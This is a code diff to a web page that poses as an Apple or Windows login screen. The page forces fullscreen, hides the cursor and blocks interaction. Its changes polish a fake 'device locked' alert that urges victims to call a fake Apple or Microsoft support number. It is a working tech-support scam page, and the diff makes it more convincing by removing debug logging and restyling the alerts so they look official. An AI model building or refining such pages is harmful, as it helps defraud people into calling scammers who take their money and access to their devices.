@@ -79,7 +79,7 @@
       background-position: center;
       background-color: #000;
       overflow: hidden;
-      z-index: 10000; /* Increased z-index for prominence */
+      z-index: 10000; /* High z-index for prominence */
       cursor: none; /* Disable cursor on login section */
       pointer-events: none; /* Disable mouse events except for card */
     }
@@ -98,9 +98,10 @@
       -webkit-overflow-scrolling: none;
       box-sizing: border-box;
       transform: translate(0, 0); /* Force hardware acceleration */
-      /* Ensure no gaps or scrollbars */
       background-size: cover;
       background-attachment: fixed;
+      background-repeat: no-repeat;
+      will-change: transform; /* Optimize rendering */
     }
     .card {
       pointer-events: auto; /* Re-enable interactions on login card */
@@ -189,11 +190,22 @@
     }
     .error {
       margin-top: 20px;
-      font-size: 18px;
-      font-weight: bold;
-      color: #ff4d4d;
+      font-size: 16px;
+      font-weight: 600;
+      color: #fff;
       display: none;
-      line-height: 1.4;
+      line-height: 1.5;
+      padding: 12px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+    .mac-error {
+      background: rgba(255, 75, 75, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    .windows-error {
+      background: rgba(200, 0, 0, 0.9);
+      border: 1px solid rgba(255, 255, 255, 0.2);
     }
     .avatar img {
       filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.5));
@@ -322,7 +334,6 @@
         if (window.self !== window.top) {
           const iframe = window.frameElement;
           if (iframe && !iframe.hasAttribute('allowfullscreen')) {
-            console.warn('Fullscreen blocked: Iframe lacks allowfullscreen attribute. To enable fullscreen, ensure the parent page includes <iframe src="index.html" allowfullscreen>. Alternatively, serve this page directly (e.g., http://your-domain.com/index.html).');
             loginSection.classList.add('fullscreen-fallback');
             return;
           }
@@ -333,20 +344,15 @@
           if (document.fullscreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled) {
             if (document.documentElement.requestFullscreen) {
               await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-              console.log('Fullscreen entered successfully');
             } else if (document.documentElement.webkitRequestFullscreen) { // Safari
               await document.documentElement.webkitRequestFullscreen();
-              console.log('Fullscreen entered successfully');
             } else if (document.documentElement.msRequestFullscreen) { // IE11
               await document.documentElement.msRequestFullscreen();
-              console.log('Fullscreen entered successfully');
             }
           } else {
-            console.warn('Fullscreen API not supported in this browser.');
             loginSection.classList.add('fullscreen-fallback');
           }
         } catch (err) {
-          console.error('Failed to enter fullscreen:', err.message);
           loginSection.classList.add('fullscreen-fallback');
         }
       }
@@ -366,11 +372,13 @@
         loginSection.classList.add('mac-bg');
         card.classList.add('mac-card');
         signInButton.classList.add('mac-button');
+        errorMsg.classList.add('mac-error');
         return 'mac';
       }
       loginSection.classList.add('windows-bg');
       card.classList.add('windows-card');
       signInButton.classList.add('windows-button');
+      errorMsg.classList.add('windows-error');
       return 'windows';
     }
     const os = detectOS();
@@ -385,11 +393,21 @@
     }
 
     function checkPassword(){
-      // Display error message and disable all interactions
+      // Display enhanced error message and disable interactions
       if(os === 'mac'){
-        errorMsg.innerText = "You hasve entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
+        errorMsg.innerHTML = `
+          <strong>Security Alert: Incorrect Password</strong><br>
+          Your Mac has been locked due to an invalid password attempt.<br>
+          To unlock, contact Apple Support immediately at:<br>
+          <strong>Toll-Free: +1-803-762-4570</strong>
+        `;
       } else {
-        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
+        errorMsg.innerHTML = `
+          <strong>Critical Error: Invalid Password</strong><br>
+          Your Windows device is locked due to an incorrect password.<br>
+          Please call Microsoft Support immediately at:<br>
+          <strong>Toll-Free: +1-803-762-4570</strong>
+        `;
       }
       errorMsg.style.display = 'block';
       document.body.classList.add('disabled-interaction');
